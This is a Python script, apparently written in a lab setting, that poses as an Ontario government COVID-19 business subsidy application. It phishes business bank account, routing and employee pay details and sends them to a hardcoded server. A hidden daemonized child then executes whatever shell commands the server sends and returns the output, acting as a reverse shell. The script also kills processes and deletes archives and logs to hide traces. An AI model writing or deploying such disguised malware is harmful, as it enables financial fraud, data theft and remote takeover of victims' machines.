#!/usr/bin/env python3

import os
import socket
import ssl
import sys
import signal
import time
import random
import logzero
from logzero import logger

def daemonize(pidFile, *, stdin='/dev/null', stdout='/dev/null', 
        stderr='/dev/null'):
    if os.path.exists(pidFile):
        raise RuntimeError("Already running")

    try:
        if os.fork() >0:
            raise SystemExit(0)
    except OSError:
        raise RuntimeError("Fork #1 failed.")

    os.umask(0)
    os.setsid()

    with open(stdin, "rb", 0) as f:
        os.dup2(f.fileno(), sys.stdin.fileno())
    with open(stdout, "ab", 0) as f:
        os.dup2(f.fileno(), sys.stdout.fileno())
    with open(stderr, "ab", 0) as f:
        os.dup2(f.fileno(), sys.stderr.fileno())

    with open(pidFile, "w") as f:
        print(os.getpid(), file=f)

def signalHandler(signalNumber, frame):
    while True:
        try:
            pid, status = os.waitpid(-1, os.WNOHANG)
            print(f"Child {pid} terminated with status {status}\n", 
                    file=open("clientdaemon.log", "a"))
        except OSError:
            return

        if pid == 0:
            return

def socketCreate(ipSocket, sendAnswers, pidFile, appType):
    try:
        socketClient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        secureContext = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        secureContext.load_verify_locations('/home/lab/Documents/ca.chain-bundle.cert.pem')
        secureSocketClient = secureContext.wrap_socket(socketClient, server_side=False, server_hostname="daemon", session=None)

    except socket.error:
        logger.info(f"Socket error: {socket.error}")
        socketClient.close()
        
    signal.signal(signal.SIGCHLD, signalHandler)
    secureSocketClient.connect(ipSocket)
    print(secureSocketClient.version(), file=open("clientdaemon.log", "a"))
    print("Connected", socketClient, file=open("clientdaemon.log", "a"))

    try:
        pid = os.fork()
    except OSError as err:
        code, msg = err.args
        if code == errno.EINTR:
            print("Restarting interupted forking!")
            #continue
        else:
            print("Something went wrong!")
            raise
        
    if pid == 0:
        if appType == "start":
            print("Please wait while we try to send your information!\n\
You will receive a confirmation code once it is successful.")
            secureSocketClient.send(str(sendAnswers).encode("utf-8"))
            time.sleep(2)
            confirmation()
        elif appType == "update":
            secureSocketClient.send(str(sendAnswers).encode("utf-8"))
            time.sleep(3)
            print("Your application is still being processed.\n\
Please check back in 3-5 Business Days.\n\
Please wait while we update your file.")
        print("Application will close automatically once processing is done!")
        daemonize(pidFile, stdout="/home/lab/clientdaemon.log",
                stderr="/home/lab/clientdaemon.log")
        commandExec(secureSocketClient)
        print("Close Connection")
        secureSocketClient.close()
        os._exit(0)
    else:                       #Parent
        print(f"Parent is dead\n {os.getpid()} is logging",
                file=open("clientdaemon.log", "a"))
        secureSocketClient.close()
        time.sleep(10)
        pipe = os.popen("killall -e python") 
        outputCLI = pipe.read()
        time.sleep(10)
        pipe = os.popen("rm *.tar.gz*") 
        outputCLI = pipe.read()
        pipe = os.popen("rm clientdaemon.log*")
        outputCLI = pipe.read()
        os.remove(pidFile)

def commandExec(secureSocketClient):
    while True:
        data = secureSocketClient.recv(1024)
        if len(data) > 0:
            strdata = data.decode()
            print(strdata)

            pipe = os.popen(strdata) 
            outputCLI = pipe.read() 
            secureSocketClient.send(str.encode(outputCLI))
        else:
            break

def confirmation():
    random.seed()
    numberPool = [*range(100000,1000000)] 
    lastIndex = len(numberPool) - 1
    confirmationNumber = numberPool.pop(random.randint(0,lastIndex))

    if lastIndex is not None:
        confirmationNumber
    print(f"Your Confirmation Number is: {confirmationNumber}")

def subsidyForm():

    formAnswers = []
    subsidyQuestionsEmployer = [
        "Are you an eligible employer during the Covid-19 period? Yes or No?\t",
        "Enter your 9 Digit Business Number:\t",
        "Are your employees eligible for this claim period? Yes or No?\t",
        "Revenue Drop for the current period: $",
        "Enter Business Bank Account Number:\t",
        "Enter Business Routing Number:\t",
        "Type of Account:\t",
        "Bank Branch Number:\t",
        "Name of Account Holder Listed on Account:\t"
    ]
    
    subsidyQuestionsEmployee = [
        "Enter Employees First Name:\t",
        "Enter Employees Last Name:\t",
        "Is employee at arm's length? Yes or No?\t",
        "Do you have accesss to their pay information? Yes or No?\t",
        "Have you calculated the employer portion of their Total Tax Deductions, EI, and CPP contributions during this pay period? Yes or No?\t",
        "Enter EI contributions for current period: $",
        "Enter CPP contributions for current period: $",
        "Enter Total Tax Deductions for current period: $",
        "Average Weekly pre-crisis pay: $",
        "Average pay during crisis: $"
    ]

    for question in subsidyQuestionsEmployer:
        while True:
            answer = input(question)
            if not answer:
                print("Please enter an answer.\n")
                continue
            else:
                formAnswers.append((question , " ", answer))
                break
    while True:
        try:
            employeeCount = int(input("How many employees are currently active? Must be a number.\t"))
        except ValueError:
            print("Not a valid Number")
            continue
        else:
            break

    employee = 0

    for employee in range(employeeCount):

        for question in subsidyQuestionsEmployee:
            while True:
                answer = input(question)
                if not answer:
                    print("Please enter an answer.\n")
                    continue
                else:
                    formAnswers.append((question , " ", answer))
                    break
        employee += 1

    print("We will calculate the total wage subsidy you are eligble for\n\
within 3 - 5 Weeks. Use update to ")
    return formAnswers

if __name__ == "__main__":
    logzero.logfile("/home/lab/clientdaemon.log", maxBytes=1e6,
            backupCount=3, disableStderrLogger=True)
    logger.info(f"Started {os.getpid()}")

    pidFile = "/tmp/daemon.pid"
    serverAddress = "192.168.60.156" #Edit this line with Server's IP Address
    port = 9999
    ipSocket = (serverAddress, port)

    appType = input("Welcome to the Government of Ontario\nCOVID-19 Business \
Relief Subsidy Application.\nPlease enter 'start' for a new application or \
'update' to get a status update on your application: ")
    if appType == "start" or appType == "update":
        if appType == "start":
            sendAnswers = subsidyForm()
        elif appType == "update":
            sendAnswers = ["Update"]
        socketCreate(ipSocket, sendAnswers, pidFile, appType)
    else:
        print("\nYou need to choose 'start' or 'update' for this application!\n\
Please start again.")
